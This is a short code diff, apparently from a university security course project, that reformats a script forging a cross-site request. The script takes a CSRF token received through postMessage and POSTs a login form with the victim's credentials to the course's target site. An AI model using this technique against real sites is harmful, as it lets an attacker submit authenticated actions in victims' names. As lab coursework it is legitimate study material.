@@ -6,13 +6,12 @@
 </form>
 		
 <script>
-window.addEventListener("message",function (e)
-{
-	var add_input = document.createElement("input");
-	add_input.type = "hidden";
-	add_input.name = "csrf_token";
-	add_input.value = new String(e.data);
-	document.getElementById("form1").appendChild(add_input);
+window.addEventListener("message",function (e) {
+	var input = document.createElement("input");
+	input.type = "hidden";
+	input.name = "csrf_token";
+	input.value = new String(e.data);
+	document.getElementById("form1").appendChild(input);
 	$.ajax({type: 'POST',data: $('#form1').serialize(),	url: 'https://eecs388.org/project2/login?csrfdefense=1&xssdefense=0',xhrFields:{withCredentials: true}});
 },false);
 </script>
